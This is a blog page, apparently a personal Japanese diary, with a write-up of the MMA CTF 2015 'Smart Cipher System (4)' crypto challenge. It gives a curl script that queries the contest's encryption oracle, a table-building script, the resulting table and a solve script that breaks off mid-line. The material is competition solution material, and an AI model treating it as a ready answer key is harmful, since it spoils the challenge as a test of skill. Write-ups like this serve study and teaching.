<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>CTF | 193s::Diary 2</title>
  <meta name="author" content="193s">
  
  <meta name="description" content="193s">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="193s::Diary 2"/>

  
    <meta property="og:image" content="undefined"/>
  

  <link href="/blog/favicon.png" rel="icon">
  <link rel="alternate" href="/blog/atom.xml" title="193s::Diary 2" type="application/atom+xml">
  <link rel="stylesheet" href="/blog/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  

</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/blog/">193s::Diary 2</a></h1>
  <h2><a href="/blog/">yet another 193s::Diary</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">Home</a></li>
    
      <li><a href="/archives">Archives</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div></header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper">
<h2 class="archive-title tag">CTF</h2>


  
    <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2015-09-08T14:10:04.000Z"><a href="/blog/2015/09/08/MMACTF2015-writeup/">Sep 8 2015</a></time>
      
      
  
    <h1 class="title"><a href="/blog/2015/09/08/MMACTF2015-writeup/">MMA CTF 1st 2015に出た話 (@_193s)</a></h1>
  

    </header>
    <div class="entry">
      
        <p><a href="https://wiki.mma.club.uec.ac.jp/" target="_blank" rel="external">MMA</a>主催の<a href="https://ctftime.org/event/234" target="_blank" rel="external">MMA CTF 1st 2015</a>にscryptosとして参加しました．</p>
<p>チームとしては終了時点で2300pts，全体で10位，日本勢の中では1位という結果になりました．</p>
<p><img src="http://i.imgur.com/bwMG1Ex.png" alt=""></p>
<h1 id="チームメンバーのwriteup:">チームメンバーのwriteup:</h1>
<ul>
<li>MMA CTF 1st 2015 writeup - しゃろの日記 <a href="http://charo-it.hatenablog.jp/entry/2015/09/08/005012" target="_blank" rel="external">http://charo-it.hatenablog.jp/entry/2015/09/08/005012</a></li>
<li>eshiho’s Blog - MMACTF 1st 2015 Writeup <a href="http://shiho-elliptic.tumblr.com/post/128549535889/mmactf-1st-2015-writeup" target="_blank" rel="external">http://shiho-elliptic.tumblr.com/post/128549535889/mmactf-1st-2015-writeup</a></li>
</ul>
<p>僕はチームのやるだけ担当なので100点以下のflagを9つ通しただけですが，Smart Cipher Systemの4とMoney Gameは面白かったのでwriteupを書いておきます．</p>
<h1 id="write-ups?">write-ups?</h1>
<h2 id="Smart_Cipher_System_(4)">Smart Cipher System (4)</h2>
<p>システム自体は1~3と同じ．<br>いちいちWeb経由で投げるのは面倒なので適当にシェルスクリプトを書いて動かしていた:</p>
<figure class="highlight shell="><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="special">#</span>!/bin/sh</div><div class="line">query="<span class="formula">$1"</span></div><div class="line">curl 'http://bow.chal.mmactf.link/<span class="special">~</span>scs/crypt6.cgi' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary02BDiWGl1MhWhe0T' --data-binary $'------WebKitFormBoundary02BDiWGl1MhWhe0T<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name="s"<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span>'"<span class="formula">$query"$</span>'<span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundary02BDiWGl1MhWhe0T<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name=".submit"<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span><span class="command">\u</span>6697<span class="command">\u</span>53f7<span class="command">\u</span>5316<span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundary02BDiWGl1MhWhe0T--<span class="command">\r</span><span class="command">\n</span>' -s <span class="command">\</span></div><div class="line">  | grep '&lt;h1&gt;Smart Cipher System' | sed -E 's/^.*&gt;(<span class="special">[</span>0-9a-f <span class="special">]</span>+)&lt;fo.*<span class="formula">$/\1/'</span></div></pre></td></tr></table></figure>

<p>しばらく実験しながら適当に考察していた．</p>
<p>長さに応じて順番が定まっているらしく，45文字の適当な文字列を突っ込んでポチポチ対応表を作って対応させた．<br>順番さえ戻せれば何も考えずに連続する2文字のテーブルを作って暗号文と対応させるだけでflagが出る．</p>
<p>table.py: </p>
<figure class="highlight python="><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">from subprocess import check_output</div><div class="line">import itertools</div><div class="line">import <span class="built_in">string</span></div><div class="line"><span class="built_in">table</span> = {}</div><div class="line"></div><div class="line">charset = <span class="string">'MMA{}0123456789abcdef'</span></div><div class="line"><span class="keyword">for</span> guess <span class="keyword">in</span> itertools.product(charset, <span class="keyword">repeat</span>=<span class="number">2</span>):</div><div class="line">  x = <span class="string">''</span>.join(guess)</div><div class="line">  <span class="built_in">print</span> x</div><div class="line">  res = check_output([<span class="string">'./ask'</span>, x])</div><div class="line">  <span class="built_in">table</span>[x] = int(res.split(<span class="string">' '</span>)[<span class="number">1</span>], <span class="number">16</span>)</div><div class="line"></div><div class="line"><span class="built_in">print</span> repr(<span class="built_in">table</span>)</div></pre></td></tr></table></figure>

<p>table:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">{<span class="string">'6{'</span>: <span class="number">222</span>, <span class="string">'6}'</span>: <span class="number">95</span>, <span class="string">'M5'</span>: <span class="number">166</span>, <span class="string">'M4'</span>: <span class="number">134</span>, <span class="string">'M7'</span>: <span class="number">230</span>, <span class="string">'M6'</span>: <span class="number">198</span>, <span class="string">'M1'</span>: <span class="number">38</span>, <span class="string">'M0'</span>: <span class="number">6</span>, <span class="string">'3M'</span>: <span class="number">106</span>, <span class="string">'M2'</span>: <span class="number">70</span>, <span class="string">'3A'</span>: <span class="number">10</span>, <span class="string">'M9'</span>: <span class="number">39</span>, <span class="string">'M8'</span>: <span class="number">7</span>, <span class="string">'3{'</span>: <span class="number">219</span>, <span class="string">'3}'</span>: <span class="number">235</span>, <span class="string">'3c'</span>: <span class="number">27</span>, <span class="string">'3b'</span>: <span class="number">19</span>, <span class="string">'3a'</span>: <span class="number">11</span>, <span class="string">'3f'</span>: <span class="number">51</span>, <span class="string">'3e'</span>: <span class="number">43</span>, <span class="string">'3d'</span>: <span class="number">35</span>, <span class="string">'Me'</span>: <span class="number">172</span>, <span class="string">'Md'</span>: <span class="number">140</span>, <span class="string">'Mf'</span>: <span class="number">204</span>, <span class="string">'Ma'</span>: <span class="number">44</span>, <span class="string">'Mc'</span>: <span class="number">108</span>, <span class="string">'Mb'</span>: <span class="number">76</span>, <span class="string">'M}'</span>: <span class="number">175</span>, <span class="string">'M{'</span>: <span class="number">111</span>, <span class="string">'39'</span>: <span class="number">201</span>, <span class="string">'38'</span>: <span class="number">193</span>, <span class="string">'MA'</span>: <span class="number">40</span>, <span class="string">'MM'</span>: <span class="number">169</span>, <span class="string">'32'</span>: <span class="number">145</span>, <span class="string">'31'</span>: <span class="number">137</span>, <span class="string">'30'</span>: <span class="number">129</span>, <span class="string">'37'</span>: <span class="number">185</span>, <span class="string">'36'</span>: <span class="number">177</span>, <span class="string">'35'</span>: <span class="number">169</span>, <span class="string">'34'</span>: <span class="number">161</span>, <span class="string">'9a'</span>: <span class="number">194</span>, <span class="string">'9c'</span>: <span class="number">198</span>, <span class="string">'9b'</span>: <span class="number">196</span>, <span class="string">'9e'</span>: <span class="number">202</span>, <span class="string">'9d'</span>: <span class="number">200</span>, <span class="string">'9f'</span>: <span class="number">204</span>, <span class="string">'9{'</span>: <span class="number">246</span>, <span class="string">'9}'</span>: <span class="number">250</span>, <span class="string">'9M'</span>: <span class="number">154</span>, <span class="string">'9A'</span>: <span class="number">130</span>, <span class="string">'99'</span>: <span class="number">114</span>, <span class="string">'98'</span>: <span class="number">112</span>, <span class="string">'91'</span>: <span class="number">98</span>, <span class="string">'90'</span>: <span class="number">96</span>, <span class="string">'93'</span>: <span class="number">102</span>, <span class="string">'92'</span>: <span class="number">100</span>, <span class="string">'95'</span>: <span class="number">106</span>, <span class="string">'94'</span>: <span class="number">104</span>, <span class="string">'97'</span>: <span class="number">110</span>, <span class="string">'96'</span>: <span class="number">108</span>, <span class="string">'f0'</span>: <span class="number">12</span>, <span class="string">'f1'</span>: <span class="number">76</span>, <span class="string">'f2'</span>: <span class="number">140</span>, <span class="string">'f3'</span>: <span class="number">204</span>, <span class="string">'f4'</span>: <span class="number">13</span>, <span class="string">'f5'</span>: <span class="number">77</span>, <span class="string">'f6'</span>: <span class="number">141</span>, <span class="string">'f7'</span>: <span class="number">205</span>, <span class="string">'f8'</span>: <span class="number">14</span>, <span class="string">'f9'</span>: <span class="number">78</span>, <span class="string">'f{'</span>: <span class="number">222</span>, <span class="string">'f}'</span>: <span class="number">95</span>, <span class="string">'fa'</span>: <span class="number">88</span>, <span class="string">'fb'</span>: <span class="number">152</span>, <span class="string">'fc'</span>: <span class="number">216</span>, <span class="string">'fd'</span>: <span class="number">25</span>, <span class="string">'fe'</span>: <span class="number">89</span>, <span class="string">'ff'</span>: <span class="number">153</span>, <span class="string">'fA'</span>: <span class="number">80</span>, <span class="string">'fM'</span>: <span class="number">83</span>, <span class="string">'24'</span>: <span class="number">208</span>, <span class="string">'25'</span>: <span class="number">212</span>, <span class="string">'26'</span>: <span class="number">216</span>, <span class="string">'27'</span>: <span class="number">220</span>, <span class="string">'20'</span>: <span class="number">192</span>, <span class="string">'21'</span>: <span class="number">196</span>, <span class="string">'22'</span>: <span class="number">200</span>, <span class="string">'23'</span>: <span class="number">204</span>, <span class="string">'28'</span>: <span class="number">224</span>, <span class="string">'29'</span>: <span class="number">228</span>, <span class="string">'2A'</span>: <span class="number">5</span>, <span class="string">'2M'</span>: <span class="number">53</span>, <span class="string">'2}'</span>: <span class="number">245</span>, <span class="string">'2{'</span>: <span class="number">237</span>, <span class="string">'2d'</span>: <span class="number">145</span>, <span class="string">'2e'</span>: <span class="number">149</span>, <span class="string">'2f'</span>: <span class="number">153</span>, <span class="string">'2a'</span>: <span class="number">133</span>, <span class="string">'2b'</span>: <span class="number">137</span>, <span class="string">'2c'</span>: <span class="number">141</span>, <span class="string">'ee'</span>: <span class="number">172</span>, <span class="string">'ed'</span>: <span class="number">140</span>, <span class="string">'ef'</span>: <span class="number">204</span>, <span class="string">'ea'</span>: <span class="number">44</span>, <span class="string">'ec'</span>: <span class="number">108</span>, <span class="string">'eb'</span>: <span class="number">76</span>, <span class="string">'e}'</span>: <span class="number">175</span>, <span class="string">'88'</span>: <span class="number">56</span>, <span class="string">'89'</span>: <span class="number">57</span>, <span class="string">'e{'</span>: <span class="number">111</span>, <span class="string">'82'</span>: <span class="number">50</span>, <span class="string">'83'</span>: <span class="number">51</span>, <span class="string">'80'</span>: <span class="number">48</span>, <span class="string">'81'</span>: <span class="number">49</span>, <span class="string">'86'</span>: <span class="number">54</span>, <span class="string">'87'</span>: <span class="number">55</span>, <span class="string">'84'</span>: <span class="number">52</span>, <span class="string">'85'</span>: <span class="number">53</span>, <span class="string">'eM'</span>: <span class="number">169</span>, <span class="string">'eA'</span>: <span class="number">40</span>, <span class="string">'8b'</span>: <span class="number">98</span>, <span class="string">'8c'</span>: <span class="number">99</span>, <span class="string">'8a'</span>: <span class="number">97</span>, <span class="string">'8f'</span>: <span class="number">102</span>, <span class="string">'8d'</span>: <span class="number">100</span>, <span class="string">'8e'</span>: <span class="number">101</span>, <span class="string">'8{'</span>: <span class="number">123</span>, <span class="string">'e9'</span>: <span class="number">39</span>, <span class="string">'e8'</span>: <span class="number">7</span>, <span class="string">'8}'</span>: <span class="number">125</span>, <span class="string">'e5'</span>: <span class="number">166</span>, <span class="string">'e4'</span>: <span class="number">134</span>, <span class="string">'e7'</span>: <span class="number">230</span>, <span class="string">'e6'</span>: <span class="number">198</span>, <span class="string">'e1'</span>: <span class="number">38</span>, <span class="string">'e0'</span>: <span class="number">6</span>, <span class="string">'e3'</span>: <span class="number">102</span>, <span class="string">'e2'</span>: <span class="number">70</span>, <span class="string">'8M'</span>: <span class="number">77</span>, <span class="string">'8A'</span>: <span class="number">65</span>, <span class="string">'{3'</span>: <span class="number">153</span>, <span class="string">'1A'</span>: <span class="number">130</span>, <span class="string">'1M'</span>: <span class="number">154</span>, <span class="string">'1{'</span>: <span class="number">246</span>, <span class="string">'1}'</span>: <span class="number">250</span>, <span class="string">'1a'</span>: <span class="number">194</span>, <span class="string">'1c'</span>: <span class="number">198</span>, <span class="string">'1b'</span>: <span class="number">196</span>, <span class="string">'1e'</span>: <span class="number">202</span>, <span class="string">'1d'</span>: <span class="number">200</span>, <span class="string">'1f'</span>: <span class="number">204</span>, <span class="string">'11'</span>: <span class="number">98</span>, <span class="string">'10'</span>: <span class="number">96</span>, <span class="string">'13'</span>: <span class="number">102</span>, <span class="string">'12'</span>: <span class="number">100</span>, <span class="string">'15'</span>: <span class="number">106</span>, <span class="string">'14'</span>: <span class="number">104</span>, <span class="string">'17'</span>: <span class="number">110</span>, <span class="string">'16'</span>: <span class="number">108</span>, <span class="string">'19'</span>: <span class="number">114</span>, <span class="string">'18'</span>: <span class="number">112</span>, <span class="string">'{7'</span>: <span class="number">185</span>, <span class="string">'7f'</span>: <span class="number">51</span>, <span class="string">'7e'</span>: <span class="number">178</span>, <span class="string">'7d'</span>: <span class="number">50</span>, <span class="string">'7c'</span>: <span class="number">177</span>, <span class="string">'M3'</span>: <span class="number">102</span>, <span class="string">'7a'</span>: <span class="number">176</span>, <span class="string">'{6'</span>: <span class="number">177</span>, <span class="string">'7}'</span>: <span class="number">190</span>, <span class="string">'7{'</span>: <span class="number">189</span>, <span class="string">'7A'</span>: <span class="number">160</span>, <span class="string">'7M'</span>: <span class="number">166</span>, <span class="string">'77'</span>: <span class="number">155</span>, <span class="string">'76'</span>: <span class="number">27</span>, <span class="string">'75'</span>: <span class="number">154</span>, <span class="string">'74'</span>: <span class="number">26</span>, <span class="string">'73'</span>: <span class="number">153</span>, <span class="string">'72'</span>: <span class="number">25</span>, <span class="string">'71'</span>: <span class="number">152</span>, <span class="string">'70'</span>: <span class="number">24</span>, <span class="string">'79'</span>: <span class="number">156</span>, <span class="string">'78'</span>: <span class="number">28</span>, <span class="string">'d8'</span>: <span class="number">131</span>, <span class="string">'d9'</span>: <span class="number">147</span>, <span class="string">'d6'</span>: <span class="number">99</span>, <span class="string">'d7'</span>: <span class="number">115</span>, <span class="string">'d4'</span>: <span class="number">67</span>, <span class="string">'d5'</span>: <span class="number">83</span>, <span class="string">'d2'</span>: <span class="number">35</span>, <span class="string">'d3'</span>: <span class="number">51</span>, <span class="string">'d0'</span>: <span class="number">3</span>, <span class="string">'d1'</span>: <span class="number">19</span>, <span class="string">'df'</span>: <span class="number">102</span>, <span class="string">'dd'</span>: <span class="number">70</span>, <span class="string">'de'</span>: <span class="number">86</span>, <span class="string">'db'</span>: <span class="number">38</span>, <span class="string">'dc'</span>: <span class="number">54</span>, <span class="string">'da'</span>: <span class="number">22</span>, <span class="string">'d}'</span>: <span class="number">215</span>, <span class="string">'d{'</span>: <span class="number">183</span>, <span class="string">'dM'</span>: <span class="number">212</span>, <span class="string">'dA'</span>: <span class="number">20</span>, <span class="string">'02'</span>: <span class="number">50</span>, <span class="string">'03'</span>: <span class="number">51</span>, <span class="string">'00'</span>: <span class="number">48</span>, <span class="string">'01'</span>: <span class="number">49</span>, <span class="string">'06'</span>: <span class="number">54</span>, <span class="string">'07'</span>: <span class="number">55</span>, <span class="string">'04'</span>: <span class="number">52</span>, <span class="string">'05'</span>: <span class="number">53</span>, <span class="string">'08'</span>: <span class="number">56</span>, <span class="string">'09'</span>: <span class="number">57</span>, <span class="string">'0A'</span>: <span class="number">65</span>, <span class="string">'0M'</span>: <span class="number">77</span>, <span class="string">'0{'</span>: <span class="number">123</span>, <span class="string">'0}'</span>: <span class="number">125</span>, <span class="string">'0b'</span>: <span class="number">98</span>, <span class="string">'0c'</span>: <span class="number">99</span>, <span class="string">'0a'</span>: <span class="number">97</span>, <span class="string">'0f'</span>: <span class="number">102</span>, <span class="string">'0d'</span>: <span class="number">100</span>, <span class="string">'0e'</span>: <span class="number">101</span>, <span class="string">'}5'</span>: <span class="number">166</span>, <span class="string">'}4'</span>: <span class="number">134</span>, <span class="string">'}7'</span>: <span class="number">230</span>, <span class="string">'}6'</span>: <span class="number">198</span>, <span class="string">'}1'</span>: <span class="number">38</span>, <span class="string">'}0'</span>: <span class="number">6</span>, <span class="string">'}3'</span>: <span class="number">102</span>, <span class="string">'}2'</span>: <span class="number">70</span>, <span class="string">'cc'</span>: <span class="number">27</span>, <span class="string">'cb'</span>: <span class="number">19</span>, <span class="string">'ca'</span>: <span class="number">11</span>, <span class="string">'}9'</span>: <span class="number">39</span>, <span class="string">'cf'</span>: <span class="number">51</span>, <span class="string">'ce'</span>: <span class="number">43</span>, <span class="string">'cd'</span>: <span class="number">35</span>, <span class="string">'60'</span>: <span class="number">12</span>, <span class="string">'61'</span>: <span class="number">76</span>, <span class="string">'62'</span>: <span class="number">140</span>, <span class="string">'63'</span>: <span class="number">204</span>, <span class="string">'64'</span>: <span class="number">13</span>, <span class="string">'65'</span>: <span class="number">77</span>, <span class="string">'c}'</span>: <span class="number">235</span>, <span class="string">'67'</span>: <span class="number">205</span>, <span class="string">'68'</span>: <span class="number">14</span>, <span class="string">'69'</span>: <span class="number">78</span>, <span class="string">'7b'</span>: <span class="number">49</span>, <span class="string">'cM'</span>: <span class="number">106</span>, <span class="string">'cA'</span>: <span class="number">10</span>, <span class="string">'{4'</span>: <span class="number">161</span>, <span class="string">'6a'</span>: <span class="number">88</span>, <span class="string">'6b'</span>: <span class="number">152</span>, <span class="string">'6c'</span>: <span class="number">216</span>, <span class="string">'6d'</span>: <span class="number">25</span>, <span class="string">'6e'</span>: <span class="number">89</span>, <span class="string">'6f'</span>: <span class="number">153</span>, <span class="string">'}}'</span>: <span class="number">175</span>, <span class="string">'}{'</span>: <span class="number">111</span>, <span class="string">'}e'</span>: <span class="number">172</span>, <span class="string">'}d'</span>: <span class="number">140</span>, <span class="string">'c9'</span>: <span class="number">201</span>, <span class="string">'}f'</span>: <span class="number">204</span>, <span class="string">'}a'</span>: <span class="number">44</span>, <span class="string">'}c'</span>: <span class="number">108</span>, <span class="string">'}b'</span>: <span class="number">76</span>, <span class="string">'c3'</span>: <span class="number">153</span>, <span class="string">'c2'</span>: <span class="number">145</span>, <span class="string">'c1'</span>: <span class="number">137</span>, <span class="string">'c0'</span>: <span class="number">129</span>, <span class="string">'c7'</span>: <span class="number">185</span>, <span class="string">'c6'</span>: <span class="number">177</span>, <span class="string">'c5'</span>: <span class="number">169</span>, <span class="string">'c4'</span>: <span class="number">161</span>, <span class="string">'6A'</span>: <span class="number">80</span>, <span class="string">'6M'</span>: <span class="number">83</span>, <span class="string">'33'</span>: <span class="number">153</span>, <span class="string">'}A'</span>: <span class="number">40</span>, <span class="string">'}M'</span>: <span class="number">169</span>, <span class="string">'ac'</span>: <span class="number">198</span>, <span class="string">'ab'</span>: <span class="number">196</span>, <span class="string">'42'</span>: <span class="number">35</span>, <span class="string">'5M'</span>: <span class="number">169</span>, <span class="string">'5A'</span>: <span class="number">40</span>, <span class="string">'5}'</span>: <span class="number">175</span>, <span class="string">'5{'</span>: <span class="number">111</span>, <span class="string">'5e'</span>: <span class="number">172</span>, <span class="string">'5d'</span>: <span class="number">140</span>, <span class="string">'5f'</span>: <span class="number">204</span>, <span class="string">'5a'</span>: <span class="number">44</span>, <span class="string">'5c'</span>: <span class="number">108</span>, <span class="string">'5b'</span>: <span class="number">76</span>, <span class="string">'}8'</span>: <span class="number">7</span>, <span class="string">'c{'</span>: <span class="number">219</span>, <span class="string">'59'</span>: <span class="number">39</span>, <span class="string">'58'</span>: <span class="number">7</span>, <span class="string">'55'</span>: <span class="number">166</span>, <span class="string">'54'</span>: <span class="number">134</span>, <span class="string">'57'</span>: <span class="number">230</span>, <span class="string">'56'</span>: <span class="number">198</span>, <span class="string">'51'</span>: <span class="number">38</span>, <span class="string">'50'</span>: <span class="number">6</span>, <span class="string">'53'</span>: <span class="number">102</span>, <span class="string">'52'</span>: <span class="number">70</span>, <span class="string">'66'</span>: <span class="number">141</span>, <span class="string">'b4'</span>: <span class="number">208</span>, <span class="string">'b5'</span>: <span class="number">212</span>, <span class="string">'b6'</span>: <span class="number">216</span>, <span class="string">'b7'</span>: <span class="number">220</span>, <span class="string">'b0'</span>: <span class="number">192</span>, <span class="string">'b1'</span>: <span class="number">196</span>, <span class="string">'b2'</span>: <span class="number">200</span>, <span class="string">'b3'</span>: <span class="number">204</span>, <span class="string">'b8'</span>: <span class="number">224</span>, <span class="string">'b9'</span>: <span class="number">228</span>, <span class="string">'bd'</span>: <span class="number">145</span>, <span class="string">'be'</span>: <span class="number">149</span>, <span class="string">'bf'</span>: <span class="number">153</span>, <span class="string">'ba'</span>: <span class="number">133</span>, <span class="string">'bb'</span>: <span class="number">137</span>, <span class="string">'bc'</span>: <span class="number">141</span>, <span class="string">'b}'</span>: <span class="number">245</span>, <span class="string">'b{'</span>: <span class="number">237</span>, <span class="string">'{c'</span>: <span class="number">27</span>, <span class="string">'bA'</span>: <span class="number">5</span>, <span class="string">'{b'</span>: <span class="number">19</span>, <span class="string">'bM'</span>: <span class="number">53</span>, <span class="string">'{a'</span>: <span class="number">11</span>, <span class="string">'4M'</span>: <span class="number">212</span>, <span class="string">'{f'</span>: <span class="number">51</span>, <span class="string">'{e'</span>: <span class="number">43</span>, <span class="string">'{d'</span>: <span class="number">35</span>, <span class="string">'Ab'</span>: <span class="number">196</span>, <span class="string">'Ad'</span>: <span class="number">200</span>, <span class="string">'aa'</span>: <span class="number">194</span>, <span class="string">'{2'</span>: <span class="number">145</span>, <span class="string">'{1'</span>: <span class="number">137</span>, <span class="string">'{0'</span>: <span class="number">129</span>, <span class="string">'ae'</span>: <span class="number">202</span>, <span class="string">'ad'</span>: <span class="number">200</span>, <span class="string">'{5'</span>: <span class="number">169</span>, <span class="string">'af'</span>: <span class="number">204</span>, <span class="string">'{9'</span>: <span class="number">201</span>, <span class="string">'{8'</span>: <span class="number">193</span>, <span class="string">'a{'</span>: <span class="number">246</span>, <span class="string">'a}'</span>: <span class="number">250</span>, <span class="string">'aA'</span>: <span class="number">130</span>, <span class="string">'48'</span>: <span class="number">131</span>, <span class="string">'49'</span>: <span class="number">147</span>, <span class="string">'46'</span>: <span class="number">99</span>, <span class="string">'47'</span>: <span class="number">115</span>, <span class="string">'44'</span>: <span class="number">67</span>, <span class="string">'45'</span>: <span class="number">83</span>, <span class="string">'aM'</span>: <span class="number">154</span>, <span class="string">'43'</span>: <span class="number">51</span>, <span class="string">'40'</span>: <span class="number">3</span>, <span class="string">'41'</span>: <span class="number">19</span>, <span class="string">'A1'</span>: <span class="number">98</span>, <span class="string">'A0'</span>: <span class="number">96</span>, <span class="string">'A3'</span>: <span class="number">102</span>, <span class="string">'A2'</span>: <span class="number">100</span>, <span class="string">'A5'</span>: <span class="number">106</span>, <span class="string">'A4'</span>: <span class="number">104</span>, <span class="string">'A7'</span>: <span class="number">110</span>, <span class="string">'A6'</span>: <span class="number">108</span>, <span class="string">'A9'</span>: <span class="number">114</span>, <span class="string">'A8'</span>: <span class="number">112</span>, <span class="string">'AA'</span>: <span class="number">130</span>, <span class="string">'{{'</span>: <span class="number">219</span>, <span class="string">'AM'</span>: <span class="number">154</span>, <span class="string">'{}'</span>: <span class="number">235</span>, <span class="string">'a1'</span>: <span class="number">98</span>, <span class="string">'a0'</span>: <span class="number">96</span>, <span class="string">'a3'</span>: <span class="number">102</span>, <span class="string">'a2'</span>: <span class="number">100</span>, <span class="string">'a5'</span>: <span class="number">106</span>, <span class="string">'a4'</span>: <span class="number">104</span>, <span class="string">'a7'</span>: <span class="number">110</span>, <span class="string">'a6'</span>: <span class="number">108</span>, <span class="string">'a9'</span>: <span class="number">114</span>, <span class="string">'a8'</span>: <span class="number">112</span>, <span class="string">'A{'</span>: <span class="number">246</span>, <span class="string">'4A'</span>: <span class="number">20</span>, <span class="string">'Aa'</span>: <span class="number">194</span>, <span class="string">'Ac'</span>: <span class="number">198</span>, <span class="string">'4}'</span>: <span class="number">215</span>, <span class="string">'Ae'</span>: <span class="number">202</span>, <span class="string">'4{'</span>: <span class="number">183</span>, <span class="string">'Af'</span>: <span class="number">204</span>, <span class="string">'A}'</span>: <span class="number">250</span>, <span class="string">'{A'</span>: <span class="number">10</span>, <span class="string">'c8'</span>: <span class="number">193</span>, <span class="string">'4f'</span>: <span class="number">102</span>, <span class="string">'4d'</span>: <span class="number">70</span>, <span class="string">'4e'</span>: <span class="number">86</span>, <span class="string">'4b'</span>: <span class="number">38</span>, <span class="string">'4c'</span>: <span class="number">54</span>, <span class="string">'{M'</span>: <span class="number">106</span>, <span class="string">'4a'</span>: <span class="number">22</span>}</div></pre></td></tr></table></figure>

<p>solve.py:</p>
<figure class="highlight python="><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line">enc_table = eval(open(<span class="string">'./table'</span>).read())</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(s)</span>:</span></div><div class="line">  <span class="keyword">return</span> map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), s.split(<span class="string">' '</span>))</div><div class="line"></div><div class="line">enc_raw = <span class="string">'62 a9 6c 28 0e 33 31 c6 68 cd 66 66 59 46 cc 53 0c 98 31 65 c6 35 c9 a9 60 4e 37 b0 33 46 0d 60 46 26 66 33 cc e6 a9 f6 6c 07 2b 23 af'</span></div><div class="line">enc = parse(enc_raw)</div><div class="line"></div><div class="line"><span class="comment"># byte flipping; ex: 0xfc -&gt; 0xcf</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">byteflip</span><span class="params">(b)</span>:</span> <span class="keyword">return</span> int(hex(b)[<span class="number">2</span>:][::-<span class="number">1</span>], <span class="number">16</span>)</div><div class="line"></div><div class="line">_sortbytes_table = [</div><div class="line">  (<span class="number">44</span>, <span class="number">44</span>), (<span class="number">43</span>, <span class="number">42</span>), (<span class="number">42</span>, <span class="number">40</span>), (<span class="number">41</span>, <span class="number">38</span>), (<span class="number">40</span>, <span class="number">36</span>), (<span class="number">39</span>, <span class="number">34</span>), (<span class="number">38</span>, <span class="number">32</span>), (<span class="number">37</span>, <span class="number">30</span>), (<span class="number">36</span>, <span class="number">28</span>), (<span class="number">35</span>, <span class="number">26</span>), (<span class="number">34</span>, <span class="number">24</span>), (<span class="number">33</span>, <span class="number">22</span>), (<span class="number">32</span>, <span class="number">20</span>), (<span class="number">31</span>, <span class="number">18</span>), (<span class="number">30</span>, <span class="number">16</span>), (<span class="number">29</span>, <span class="number">14</span>), (<span class="number">28</span>, <span class="number">12</span>), (<span class="number">27</span>, <span class="number">10</span>), (<span class="number">26</span>, <span class="number">8</span>), (<span class="number">25</span>, <span class="number">6</span>), (<span class="number">24</span>, <span class="number">4</span>), (<span class="number">23</span>, <span class="number">2</span>), (<span class="number">22</span>, <span class="number">0</span>), (<span class="number">21</span>, <span class="number">33</span>), (<span class="number">20</span>, <span class="number">21</span>), (<span class="number">19</span>, <span class="number">41</span>), (<span class="number">18</span>, <span class="number">19</span>), (<span class="number">17</span>, <span class="number">31</span>), (<span class="number">16</span>, <span class="number">17</span>), (<span class="number">15</span>, <span class="number">37</span>), (<span class="number">14</span>, <span class="number">15</span>), (<span class="number">13</span>, <span class="number">29</span>), (<span class="number">12</span>, <span class="number">13</span>), (<span class="number">11</span>, <span class="number">43</span>), (<span class="number">10</span>, <span class="number">11</span>), (<span class="number">9</span>, <span class="number">26</span>), (<span class="number">8</span>, <span class="number">9</span>), (<span class="number">7</span>, <span class="number">35</span>), (<span class="number">6</span>, <span class="number">7</span>), (<span class="number">5</span>, <span class="number">25</span>), (<span class="number">4</span>, <span class="number">5</span>), (<span class="number">3</span>, <span class="number">39</span>), (<span class="number">2</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">23</span>), (<span class="number">0</span>, <span class="number">1</span>),</div><div class="line">]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sortbytes_rev</span><span class="params">(li)</span>:</span></div><div class="line">  <span class="keyword">assert</span> len(li) == <span class="number">45</span></div><div class="line">  res = 